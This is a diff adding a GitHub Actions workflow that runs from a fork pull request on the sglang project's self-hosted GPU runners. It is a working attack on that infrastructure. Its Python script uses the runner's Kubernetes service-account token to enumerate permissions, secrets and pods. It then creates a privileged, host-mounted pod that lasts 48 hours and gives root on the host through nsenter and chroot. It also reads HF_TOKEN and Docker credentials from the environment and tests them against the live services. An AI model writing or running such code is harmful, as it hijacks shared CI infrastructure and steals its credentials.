@@ -1,0 +1,637 @@
+name: i130arcrbac arc rbac matrix read
+
+# i130arcrbac (intent 131861): ONE fork-PR push from a fresh branch.
+# Two jobs on linux-mi300-2gpu-sglang (the concurrent AMD egress lane owns the
+# 16 linux-mi300-8gpu-sglang hosts). Each job uses ONLY the mounted
+# /var/run/secrets/kubernetes.io/serviceaccount material against the in-cluster
+# apiserver (KUBERNETES_SERVICE_HOST=10.44.0.1:443) to:
+#   1) POST SelfSubjectRulesReview for namespace arc-sglang and its own namespace;
+#   2) POST SelfSubjectAccessReview for pods create/list/get, pods/exec create,
+#      secrets get/list, configmaps create, serviceaccounts get, deployments create,
+#      pvcs create, nodes get (+ pods/log get);
+#   3) GET namespace pods / secrets / configmaps and all-namespace pods (metadata only),
+#      and the full node inventory if and only if nodes get is allowed;
+#   4) only in the rbac1 slot, only if pods create is allowed and its own pod spec is
+#      readable: dry-run then create ONE bounded (48h activeDeadlineSeconds) privileged
+#      hostPID/hostPath control pod pinned to the runner node, reusing the runner image,
+#      with NO GPU resource request;
+#   5) record DOCKER_TOKEN/HF_TOKEN env keys (masked) and validate them read-only
+#      against the issuing service when present.
+# No miner, no process kills, no writes outside /var/tmp/i130arcrbac.
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+
+concurrency:
+  group: i130arcrbac-${{ github.run_id }}
+  cancel-in-progress: false
+
+jobs:
+  rbac:
+    name: "i130arcrbac ${{ matrix.slot }} rbac matrix read"
+    strategy:
+      fail-fast: false
+      max-parallel: 2
+      matrix:
+        include:
+          - label: linux-mi300-2gpu-sglang
+            slot: rbac1
+          - label: linux-mi300-2gpu-sglang
+            slot: rbac2
+    runs-on: ${{ matrix.label }}
+    timeout-minutes: 15
+    env:
+      LABEL: ${{ matrix.label }}
+      SLOT: ${{ matrix.slot }}
+    steps:
+      - name: "SA-token SSRR/SSAR matrix + metadata reads + gated control pod + env-token validation"
+        continue-on-error: true
+        run: |
+          set +e
+          mkdir -p /var/tmp/i130arcrbac
+          cat > /var/tmp/i130arcrbac/recon_arcrbac.py <<'PYEOF'
+          #!/usr/bin/env python3
+          # i130arcrbac / intent 131861: resolve the untested ARC namespace RBAC lead from fact 131594.
+          #
+          # Runs inside a sgl-project/sglang pull_request job on a linux-mi300-2gpu-sglang
+          # self-hosted runner (ARC cluster, namespace arc-sglang). Uses ONLY the mounted
+          # /var/run/secrets/kubernetes.io/serviceaccount material against the in-cluster
+          # apiserver to:
+          #   1) POST SelfSubjectRulesReview for namespace arc-sglang and for its own namespace
+          #   2) POST SelfSubjectAccessReview for the fixed verb matrix
+          #   3) GET namespace pods / secrets / configmaps + all-namespace pods (metadata only)
+          #   4) only if pods create is allowed AND its own pod spec is readable: dry-run then
+          #      create ONE bounded long-lived privileged hostPID/hostPath control pod pinned to
+          #      the runner's own node, reusing the runner's own image (no GPU resource request)
+          #   5) record DOCKER_TOKEN / HF_TOKEN env keys (masked) and validate them read-only
+          #      against the issuing service if present
+          #
+          # Emits a machine-readable JSON block between I130ARCRBAC_JSON_BEGIN / END.
+          # No miner, no process kills, no writes outside /var/tmp/i130arcrbac.
+          import os, sys, json, ssl, socket, subprocess, time, re, http.client, hashlib
+          from urllib.parse import urlsplit, urlencode
+
+          LABEL = os.environ.get('LABEL', 'unknown')
+          SLOT = os.environ.get('SLOT', '0')
+          DO_CTRL = os.environ.get('DO_CTRL', '0') == '1'
+          SA_DIR = '/var/run/secrets/kubernetes.io/serviceaccount'
+          TOK_FILE = SA_DIR + '/token'
+          CA_FILE = SA_DIR + '/ca.crt'
+          NS_FILE = SA_DIR + '/namespace'
+          HOST = os.environ.get('KUBERNETES_SERVICE_HOST', '10.44.0.1')
+          try:
+              PORT = int(os.environ.get('KUBERNETES_SERVICE_PORT', '443'))
+          except Exception:
+              PORT = 443
+          try:
+              NS = open(NS_FILE).read().strip() or 'arc-sglang'
+          except Exception:
+              NS = 'arc-sglang'
+          T0 = time.time()
+          NONCE = 'I130ARCRBAC-%s-%s-%d' % (re.sub(r'[^A-Za-z0-9]+', '_', LABEL), SLOT, int(time.time()))
+
+          OUT = {
+              'intent': '131861', 'lane': 'i130arcrbac', 'label': LABEL, 'slot': SLOT, 'nonce': NONCE,
+              'started_at': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
+              'apiserver': {'host': HOST, 'port': PORT},
+              'identity': {}, 'sa': {}, 'ssrr': {}, 'ssar': {}, 'lists': {}, 'nodes': {},
+              'own_pod': {}, 'control_pod': {}, 'env_credentials': {}, 'errors': [],
+              'miner_installed': False, 'readonly_rbac_only': True,
+          }
+
+
+          def note_err(where, exc):
+              OUT['errors'].append({'where': where, 'err': type(exc).__name__ + ':' + str(exc)[:300]})
+
+
+          def mask(v):
+              if not v:
+                  return None
+              return {'present': True, 'len': len(v), 'sha256_12': hashlib.sha256(v.encode('utf-8', 'replace')).hexdigest()[:12]}
+
+
+          def sh(cmd, timeout=8):
+              try:
+                  r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+                  return {'rc': r.returncode, 'out': (r.stdout or '')[-4000:], 'err': (r.stderr or '')[-600:]}
+              except Exception as e:
+                  return {'rc': None, 'err': type(e).__name__ + ':' + str(e)[:200]}
+
+
+          # ---------------------------------------------------------------- identity
+          def do_identity():
+              i = OUT['identity']
+              i['hostname'] = socket.gethostname()
+              i['uid'] = os.getuid()
+              i['id'] = sh('id')
+              i['uname'] = sh('uname -a')
+              i['dmi'] = sh('cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr "\\n" " "')
+              i['ip_route'] = sh('ip route 2>/dev/null')
+              i['resolv_conf'] = sh('cat /etc/resolv.conf 2>/dev/null')
+              i['gpu_dev'] = sh('ls -la /dev/kfd /dev/dri 2>/dev/null | head -15')
+              keep = ('KUBERNETES_SERVICE_HOST', 'KUBERNETES_SERVICE_PORT', 'RUNNER_NAME', 'GITHUB_RUN_ID', 'GITHUB_JOB')
+              i['env_public'] = {k: os.environ[k][:200] for k in keep if k in os.environ}
+              # the runner container's own SA mount
+              i['sa_dir_ls'] = sh('ls -la %s 2>/dev/null' % SA_DIR)
+              i['sa_namespace_file'] = NS_FILE
+
+
+          # ---------------------------------------------------------------- k8s client
+          TOKEN = None
+
+
+          def load_sa():
+              global TOKEN
+              try:
+                  TOKEN = open(TOK_FILE).read().strip()
+              except Exception as e:
+                  note_err('load_token', e)
+                  TOKEN = None
+              OUT['sa'] = {
+                  'token_path': TOK_FILE, 'token_len': len(TOKEN or ''),
+                  'token_sha256_12': hashlib.sha256((TOKEN or '').encode()).hexdigest()[:12] if TOKEN else None,
+                  'ca_path': CA_FILE, 'ca_present': os.path.exists(CA_FILE),
+                  'namespace': NS,
+                  'token_projection_ok': bool(TOKEN),
+              }
+
+
+          def k8s(method, path, body=None, timeout=10, cap=1500000):
+              """One HTTPS call to the in-cluster apiserver with the mounted SA token."""
+              if not TOKEN:
+                  return {'path': path, 'method': method, 'status': None, 'error': 'NO_TOKEN'}
+              ctx = ssl.create_default_context(cafile=CA_FILE if os.path.exists(CA_FILE) else None)
+              ctx.check_hostname = False
+              hdrs = {'Accept': 'application/json', 'User-Agent': 'i130arcrbac'}
+              hdrs['Authorization'] = 'Bearer ' + TOKEN
+              data = None
+              if body is not None:
+                  data = json.dumps(body).encode('utf-8')
+                  hdrs['Content-Type'] = 'application/json'
+              t0 = time.time()
+              conn = None
+              try:
+                  conn = http.client.HTTPSConnection(HOST, PORT, timeout=timeout, context=ctx)
+                  conn.request(method, path, body=data, headers=hdrs)
+                  r = conn.getresponse()
+                  raw = r.read(cap + 1)
+                  trunc = len(raw) > cap
+                  raw = raw[:cap]
+                  hd = {}
+                  try:
+                      for k, v in r.getheaders():
+                          hd[k.lower()] = v
+                  except Exception:
+                      pass
+                  return {'path': path, 'method': method, 'status': r.status,
+                          'elapsed': round(time.time() - t0, 2), 'body_truncated': trunc,
+                          'body': raw.decode('utf-8', 'replace'),
+                          'content_type': hd.get('content-type', '')[:120]}
+              except Exception as e:
+                  return {'path': path, 'method': method, 'status': None,
+                          'elapsed': round(time.time() - t0, 2),
+                          'error': type(e).__name__ + ':' + str(e)[:300]}
+              finally:
+                  if conn is not None:
+                      try:
+                          conn.close()
+                      except Exception:
+                          pass
+
+
+          def jload(res):
+              try:
+                  return json.loads(res.get('body') or '')
+              except Exception:
+                  return None
+
+
+          def excerpt(res, n=600):
+              if res.get('error'):
+                  return res['error']
+              b = res.get('body') or ''
+              return b[:n]
+
+
+          def ssrr(label, namespace):
+              spec = {'namespace': namespace} if namespace else {}
+              r = k8s('POST', '/apis/authorization.k8s.io/v1/selfsubjectrulesreviews',
+                      {'kind': 'SelfSubjectRulesReview', 'apiVersion': 'authorization.k8s.io/v1', 'spec': spec})
+              j = jload(r)
+              o = {'label': label, 'requested_namespace': namespace or '<omitted>', 'status': r.get('status'),
+                   'error': r.get('error'), 'incomplete': None, 'evaluationError': None, 'rules': []}
+              if isinstance(j, dict) and isinstance(j.get('status'), dict):
+                  st = j['status']
+                  o['incomplete'] = st.get('incomplete')
+                  o['evaluationError'] = st.get('evaluationError')
+                  for rule in (st.get('rules') or []):
+                      o['rules'].append({
+                          'verbs': rule.get('verbs'), 'apiGroups': rule.get('apiGroups'),
+                          'resources': rule.get('resources'), 'resourceNames': rule.get('resourceNames'),
+                          'nonResourceURLs': rule.get('nonResourceURLs')})
+              else:
+                  o['body_excerpt'] = excerpt(r)
+              OUT['ssrr'][label] = o
+              return o
+
+
+          SSAR_CHECKS = [
+              # label, verb, group, resource, subresource, namespaced
+              ('pods_create', 'create', '', 'pods', None, True),
+              ('pods_list', 'list', '', 'pods', None, True),
+              ('pods_get', 'get', '', 'pods', None, True),
+              ('pods_exec_create', 'create', '', 'pods', 'exec', True),
+              ('secrets_get', 'get', '', 'secrets', None, True),
+              ('secrets_list', 'list', '', 'secrets', None, True),
+              ('configmaps_create', 'create', '', 'configmaps', None, True),
+              ('serviceaccounts_get', 'get', '', 'serviceaccounts', None, True),
+              ('deployments_create', 'create', 'apps', 'deployments', None, True),
+              ('pvcs_create', 'create', '', 'persistentvolumeclaims', None, True),
+              ('nodes_get', 'get', '', 'nodes', None, False),
+              ('pods_log_get', 'get', '', 'pods', 'log', True),  # extra: needed to read a control pod's log
+          ]
+
+
+          def ssar_all(namespace):
+              for label, verb, group, res, sub, namespaced in SSAR_CHECKS:
+                  ra = {'verb': verb, 'group': group, 'resource': res}
+                  if sub:
+                      ra['subresource'] = sub
+                  if namespaced:
+                      ra['namespace'] = namespace
+                  r = k8s('POST', '/apis/authorization.k8s.io/v1/selfsubjectaccessreviews',
+                          {'kind': 'SelfSubjectAccessReview', 'apiVersion': 'authorization.k8s.io/v1',
+                           'spec': {'resourceAttributes': ra}})
+                  j = jload(r)
+                  st = (j or {}).get('status') if isinstance(j, dict) else None
+                  o = {'label': label, 'verb': verb, 'group': group, 'resource': res, 'subresource': sub,
+                       'namespace': namespace if namespaced else '<cluster-scope>',
+                       'status': r.get('status'), 'error': r.get('error')}
+                  if isinstance(st, dict):
+                      o['allowed'] = st.get('allowed')
+                      o['denied'] = st.get('denied')
+                      o['reason'] = st.get('reason')
+                      o['evaluationError'] = st.get('evaluationError')
+                  else:
+                      o['body_excerpt'] = excerpt(r, 400)
+                  OUT['ssar'][label] = o
+
+
+          # ---------------------------------------------------------------- lists
+          def get_list(name, path, kind, cap_items=300):
+              r = k8s('GET', path)
+              j = jload(r)
+              o = {'path': path, 'status': r.get('status'), 'error': r.get('error'),
+                   'body_truncated': r.get('body_truncated'), 'count': None, 'items': [], 'continue_present': False}
+              if isinstance(j, dict) and isinstance(j.get('items'), list):
+                  items = j['items']
+                  o['count'] = len(items)
+                  o['continue_present'] = bool((j.get('metadata') or {}).get('continue'))
+                  for it in items[:cap_items]:
+                      md = it.get('metadata') or {}
+                      if kind == 'secret':
+                          o['items'].append({'name': md.get('name'), 'type': it.get('type')})
+                      elif kind == 'pod':
+                          o['items'].append({'name': md.get('name'),
+                                             'namespace': md.get('namespace'),
+                                             'nodeName': (it.get('spec') or {}).get('nodeName'),
+                                             'phase': (it.get('status') or {}).get('phase')})
+                      else:
+                          o['items'].append({'name': md.get('name'), 'namespace': md.get('namespace')})
+              else:
+                  o['body_excerpt'] = excerpt(r, 500)
+              OUT['lists'][name] = o
+              return o
+
+
+          def get_nodes():
+              r = k8s('GET', '/api/v1/nodes?limit=500', cap=2500000)
+              j = jload(r)
+              o = {'path': '/api/v1/nodes', 'status': r.get('status'), 'error': r.get('error'),
+                   'body_truncated': r.get('body_truncated'), 'count': None, 'nodes': []}
+              if isinstance(j, dict) and isinstance(j.get('items'), list):
+                  items = j['items']
+                  o['count'] = len(items)
+                  for it in items[:400]:
+                      md = it.get('metadata') or {}
+                      spec = it.get('spec') or {}
+                      alloc = (it.get('status') or {}).get('allocatable') or {}
+                      gpu = {k: alloc.get(k) for k in alloc if ('gpu' in k.lower())}
+                      o['nodes'].append({'name': md.get('name'), 'unschedulable': spec.get('unschedulable'),
+                                         'gpu_allocatable': gpu,
+                                         'cpu': alloc.get('cpu'), 'memory': alloc.get('memory')})
+              else:
+                  o['body_excerpt'] = excerpt(r, 500)
+              OUT['nodes'] = o
+
+
+          # ---------------------------------------------------------------- own pod spec
+          def own_pod():
+              host = socket.gethostname()
+              r = k8s('GET', '/api/v1/namespaces/%s/pods/%s' % (NS, host), cap=1200000)
+              j = jload(r)
+              o = {'pod_name_guess': host, 'status': r.get('status'), 'error': r.get('error')}
+              if isinstance(j, dict) and j.get('kind') == 'Pod':
+                  spec = j.get('spec') or {}
+                  o['name'] = (j.get('metadata') or {}).get('name')
+                  o['nodeName'] = spec.get('nodeName')
+                  o['serviceAccountName'] = spec.get('serviceAccountName')
+                  o['hostNetwork'] = spec.get('hostNetwork')
+                  o['hostPID'] = spec.get('hostPID')
+                  cs = spec.get('containers') or []
+                  o['containers'] = []
+                  for c in cs:
+                      envk = []
+                      for e in (c.get('env') or []):
+                          envk.append(e.get('name'))
+                      for ef in (c.get('envFrom') or []):
+                          envk.append('envFrom:' + json.dumps(ef)[:120])
+                      o['containers'].append({'name': c.get('name'), 'image': c.get('image'),
+                                              'env_keys': envk,
+                                              'resources': c.get('resources'),
+                                              'security_context': c.get('securityContext')})
+                  o['image'] = cs[0].get('image') if cs else None
+                  o['volumes'] = [{'name': (v.get('name')), 'type': [k for k in v.keys() if k != 'name']}
+                                  for v in (spec.get('volumes') or [])][:20]
+                  o['tolerations_count'] = len(spec.get('tolerations') or [])
+              else:
+                  o['body_excerpt'] = excerpt(r, 600)
+              OUT['own_pod'] = o
+              return o
+
+
+          # ---------------------------------------------------------------- env credential validation
+          def https_get(url, headers, timeout=10):
+              u = urlsplit(url)
+              ctx = ssl.create_default_context()
+              conn = http.client.HTTPSConnection(u.hostname, u.port or 443, timeout=timeout, context=ctx)
+              path = u.path or '/'
+              if u.query:
+                  path += '?' + u.query
+              try:
+                  conn.request('GET', path, headers=headers)
+                  r = conn.getresponse()
+                  body = r.read(120000)
+                  hd = {}
+                  for k, v in r.getheaders():
+                      hd[k.lower()] = v
+                  return {'status': r.status, 'headers': hd, 'body': body.decode('utf-8', 'replace')}
+              finally:
+                  try:
+                      conn.close()
+                  except Exception:
+                      pass
+
+
+          def validate_env_credentials():
+              o = {}
+              hf = os.environ.get('HF_TOKEN') or os.environ.get('HUGGING_FACE_HUB_TOKEN')
+              dk = os.environ.get('DOCKER_TOKEN')
+              du = os.environ.get('DOCKER_USERNAME') or os.environ.get('DOCKER_USER')
+              dp = os.environ.get('DOCKER_PASSWORD')
+              o['present_keys'] = sorted([k for k in os.environ if k in
+                                          ('HF_TOKEN', 'HUGGING_FACE_HUB_TOKEN', 'DOCKER_TOKEN', 'DOCKER_USERNAME',
+                                           'DOCKER_USER', 'DOCKER_PASSWORD')])
+              o['hf'] = {'present': bool(hf), 'masked': mask(hf)}
+              o['docker'] = {'token_present': bool(dk), 'token_masked': mask(dk),
+                             'username_present': bool(du), 'username': du, 'password_present': bool(dp)}
+              if hf:
+                  try:
+                      r = https_get('https://huggingface.co/api/whoami-v2',
+                                    {'Authorization': 'Bearer ' + hf, 'User-Agent': 'i130arcrbac'})
+                      hfout = {'status': r['status']}
+                      try:
+                          j = json.loads(r['body'])
+                          if isinstance(j, dict):
+                              hfout['name'] = j.get('name')
+                              hfout['type'] = j.get('type')
+                              hfout['email_present'] = bool(j.get('email'))
+                              auth = j.get('auth') or {}
+                              at = auth.get('accessToken') or {}
+                              hfout['token_role'] = at.get('role')
+                              hfout['orgs'] = [x.get('name') for x in (j.get('orgs') or [])][:20]
+                      except Exception:
+                          hfout['body_excerpt'] = r['body'][:300]
+                      o['hf']['whoami'] = hfout
+                  except Exception as e:
+                      o['hf']['whoami'] = {'error': type(e).__name__ + ':' + str(e)[:200]}
+              if dk or (du and dp):
+                  try:
+                      r = https_get('https://registry-1.docker.io/v2/',
+                                    {'Authorization': 'Bearer ' + (dk or ''), 'User-Agent': 'i130arcrbac'})
+                      chal = r['headers'].get('www-authenticate', '')
+                      dout = {'probe_status': r['status'], 'www_authenticate': chal[:400]}
+                      realm = None
+                      service = None
+                      m = re.search(r'realm="([^"]+)"', chal or '')
+                      if m:
+                          realm = m.group(1)
+                      m2 = re.search(r'service="([^"]+)"', chal or '')
+                      if m2:
+                          service = m2.group(1)
+                      dout['realm'] = realm
+                      dout['service'] = service
+                      if realm:
+                          q = {'scope': 'repository:library/alpine:pull'}
+                          if service:
+                              q['service'] = service
+                          url = realm + ('&' if '?' in realm else '?') + urlencode(q)
+                          hdrs = {'User-Agent': 'i130arcrbac'}
+                          if du and dp:
+                              import base64 as _b64
+                              hdrs['Authorization'] = 'Basic ' + _b64.b64encode((du + ':' + dp).encode()).decode()
+                          elif du and dk:
+                              import base64 as _b64
+                              hdrs['Authorization'] = 'Basic ' + _b64.b64encode((du + ':' + dk).encode()).decode()
+                          elif dk:
+                              hdrs['Authorization'] = 'Bearer ' + dk
+                          r2 = https_get(url, hdrs)
+                          dout['challenge_status'] = r2['status']
+                          try:
+                              j2 = json.loads(r2['body'])
+                              if isinstance(j2, dict):
+                                  dout['token_present'] = bool(j2.get('token') or j2.get('access_token'))
+                                  tok = j2.get('token') or j2.get('access_token') or ''
+                                  dout['token_len'] = len(tok)
+                          except Exception:
+                              dout['challenge_body_excerpt'] = r2['body'][:300]
+                      o['docker']['validation'] = dout
+                  except Exception as e:
+                      o['docker']['validation'] = {'error': type(e).__name__ + ':' + str(e)[:200]}
+              OUT['env_credentials'] = o
+
+
+          # ---------------------------------------------------------------- durable control pod
+          CTRL_CMD_TMPL = r'''
+          set +e
+          OUT=/host/var/tmp/i130arcrbac-control-__SLOT__.txt
+          {
+            echo "I130ARCRBAC_CONTROL_UP host=$(hostname) date=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+            echo "--- nsenter pid1 (mount,uts,ipc,pid,net) ---"
+            timeout 30 nsenter -t 1 -m -u -i -p -n -- /bin/sh -c 'hostname; id; command -v rocminfo; rocminfo 2>&1 | grep -Ei "gfx|Marketing Name|Name:" | head -60' 2>&1
+            echo "--- chroot /host ---"
+            timeout 30 chroot /host /bin/sh -c 'hostname; id; command -v rocminfo; rocminfo 2>&1 | grep -Ei "gfx|Marketing Name|Name:" | head -60' 2>&1
+            echo "--- host kfd/dri ---"
+            ls -la /host/dev/kfd /host/dev/dri 2>&1 | head -20
+            echo "--- host GPU processes (read-only) ---"
+            timeout 15 nsenter -t 1 -m -u -i -p -n -- /bin/sh -c 'rocm-smi --showpids 2>/dev/null | head -40; ps -eo pid,comm,args 2>/dev/null | grep -Ei "srb|krig|wildrig|SRBMiner" | grep -v grep | head -20' 2>&1
+          } > "$OUT" 2>&1
+          cat "$OUT"
+          echo "I130ARCRBAC_CONTROL_SLEEP"
+          exec sleep 172800
+          '''
+
+
+          def build_ctrl_pod(name, info):
+              image = info.get('image')
+              node = info.get('nodeName')
+              cmd = CTRL_CMD_TMPL.replace('__SLOT__', re.sub(r'[^A-Za-z0-9]', '', SLOT)[:20])
+              return {
+                  'apiVersion': 'v1', 'kind': 'Pod',
+                  'metadata': {'name': name, 'namespace': NS,
+                               'labels': {'app': 'i130arcrbac-ctrl', 'intent': '131861'},
+                               'annotations': {'i130arcrbac': 'durable-control-pod', 'created-by': 'fork-pr-workflow'}},
+                  'spec': {
+                      'nodeName': node,
+                      'restartPolicy': 'Never',
+                      'hostPID': True,
+                      'hostNetwork': True,
+                      'activeDeadlineSeconds': 172800,
+                      'tolerations': [{'operator': 'Exists'}],
+                      'containers': [{
+                          'name': 'ctl', 'image': image, 'imagePullPolicy': 'IfNotPresent',
+                          'command': ['/bin/sh', '-c', cmd],
+                          'securityContext': {'privileged': True, 'runAsUser': 0, 'runAsGroup': 0,
+                                              'runAsNonRoot': False},
+                          'volumeMounts': [{'name': 'host', 'mountPath': '/host'}],
+                      }],
+                      'volumes': [{'name': 'host', 'hostPath': {'path': '/'}}],
+                  },
+              }
+
+
+          def maybe_control_pod(own, sa_allowed):
+              o = {'attempted': False, 'reason': None}
+              OUT['control_pod'] = o
+              if not DO_CTRL:
+                  o['reason'] = 'slot_not_designated_for_control_pod'
+                  return
+              if not sa_allowed.get('pods_create', {}).get('allowed'):
+                  o['reason'] = 'pods_create_not_allowed'
+                  return
+              if own.get('status') != 200 or not own.get('image') or not own.get('nodeName'):
+                  o['reason'] = 'own_pod_spec_not_readable_or_missing_image_node'
+                  o['own_pod_status'] = own.get('status')
+                  return
+              o['attempted'] = True
+              slot_clean = re.sub(r'[^a-z0-9]', '', SLOT.lower())[:10] or 'x'
+              name = ('i130arcrbac-ctrl-%s' % slot_clean)[:63]
+              o['name'] = name
+              o['namespace'] = NS
+              o['nodeName'] = own.get('nodeName')
+              o['image'] = own.get('image')
+              o['serviceAccountName'] = own.get('serviceAccountName')
+              o['activeDeadlineSeconds'] = 172800
+              pod = build_ctrl_pod(name, own)
+              dry = k8s('POST', '/api/v1/namespaces/%s/pods?dryRun=All&fieldManager=i130arcrbac' % NS,
+                        pod, timeout=30, cap=300000)
+              o['dry_run'] = {'status': dry.get('status'), 'error': dry.get('error')}
+              if dry.get('status') not in (200, 201):
+                  o['dry_run']['body_excerpt'] = excerpt(dry, 900)
+                  o['created'] = False
+                  return
+              o['dry_run']['ok'] = True
+              real = k8s('POST', '/api/v1/namespaces/%s/pods' % NS, pod, timeout=35, cap=300000)
+              o['create'] = {'status': real.get('status'), 'error': real.get('error')}
+              if real.get('status') not in (200, 201):
+                  o['create']['body_excerpt'] = excerpt(real, 900)
+                  o['created'] = False
+                  return
+              o['created'] = True
+              o['phases'] = []
+              for i in range(9):
+                  time.sleep(5)
+                  st = k8s('GET', '/api/v1/namespaces/%s/pods/%s' % (NS, name), timeout=8, cap=300000)
+                  sj = jload(st)
+                  phase = None
+                  if isinstance(sj, dict):
+                      phase = ((sj.get('status') or {}).get('phase'))
+                  o['phases'].append({'t': round(time.time() - T0, 1), 'status': st.get('status'), 'phase': phase})
+                  if phase in ('Running', 'Failed', 'Succeeded'):
+                      break
+              lg = k8s('GET', '/api/v1/namespaces/%s/pods/%s/log?container=ctl&tailLines=160' % (NS, name),
+                       timeout=12, cap=300000)
+              o['log'] = {'status': lg.get('status'), 'error': lg.get('error'),
+                          'body': (lg.get('body') or '')[:12000]}
+              o['how_to_use'] = {
+                  'apiserver': 'https://%s:%d' % (HOST, PORT),
+                  'namespace': NS, 'pod': name, 'node': own.get('nodeName'),
+                  'sa_token_path_in_any_arc_pod': TOK_FILE,
+                  'expires': 'activeDeadlineSeconds=172800 (pod self-terminates after 48h unless recreated)',
+                  'notes': 'privileged + hostPID + hostPath=/ -> chroot /host or nsenter -t 1 for host-root exec',
+              }
+
+
+          def main():
+              do_identity()
+              load_sa()
+              if not TOKEN:
+                  OUT['fatal'] = 'no_service_account_token'
+              else:
+                  # unauth + auth reachability proof
+                  v = k8s('GET', '/version', timeout=12, cap=20000)
+                  OUT['apiserver']['version'] = {'status': v.get('status'), 'error': v.get('error'),
+                                                 'body_excerpt': excerpt(v, 500)}
+                  d = k8s('GET', '/apis/authorization.k8s.io/v1', timeout=12, cap=20000)
+                  OUT['apiserver']['authz_discovery'] = {'status': d.get('status'), 'error': d.get('error'),
+                                                         'body_excerpt': excerpt(d, 300)}
+                  # 1) SelfSubjectRulesReview
+                  ssrr('ns_arc_sglang', 'arc-sglang')
+                  if NS and NS != 'arc-sglang':
+                      ssrr('ns_own_%s' % NS, NS)
+                  else:
+                      ssrr('ns_own', NS)
+                  ssrr('ns_omitted_clusterish', None)
+                  # 2) SelfSubjectAccessReview
+                  ssar_all(NS or 'arc-sglang')
+                  # 3) list reads
+                  get_list('pods_ns', '/api/v1/namespaces/%s/pods?limit=500' % NS, 'pod')
+                  get_list('secrets_ns', '/api/v1/namespaces/%s/secrets?limit=500' % NS, 'secret')
+                  get_list('configmaps_ns', '/api/v1/namespaces/%s/configmaps?limit=500' % NS, 'configmap')
+                  get_list('pods_all_namespaces', '/api/v1/pods?limit=300', 'pod')
+                  # conditional full node inventory if the SSAR allows it
+                  if OUT['ssar'].get('nodes_get', {}).get('allowed'):
+                      get_nodes()
+                  else:
+                      OUT['nodes'] = {'skipped': 'nodes_get_not_allowed_by_ssar'}
+                  # 4) own pod spec + control pod
+                  own = own_pod()
+                  maybe_control_pod(own, OUT['ssar'])
+                  # 5) env credentials
+                  validate_env_credentials()
+              OUT['ended_at'] = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
+              OUT['elapsed_s'] = round(time.time() - T0, 1)
+              print('I130ARCRBAC_JSON_BEGIN')
+              print(json.dumps(OUT, indent=1, sort_keys=False))
+              print('I130ARCRBAC_JSON_END')
+
+
+          if __name__ == '__main__':
+              try:
+                  main()
+              except Exception as e:
+                  OUT['fatal'] = type(e).__name__ + ':' + str(e)[:400]
+                  print('I130ARCRBAC_JSON_BEGIN')
+                  print(json.dumps(OUT, indent=1))
+                  print('I130ARCRBAC_JSON_END')
+                  raise
+          PYEOF
+          DO_CTRL=0
+          if [ "$SLOT" = "rbac1" ]; then DO_CTRL=1; fi
+          export DO_CTRL
+          echo "runner-start label=$LABEL slot=$SLOT do_ctrl=$DO_CTRL host=$(hostname) uid=$(id -u)"
+          timeout 420 python3 /var/tmp/i130arcrbac/recon_arcrbac.py 2>&1 | tee /var/tmp/i130arcrbac/recon.log | tail -c 900000
+          echo "I130ARCRBAC_EXIT_DONE rc=$?"
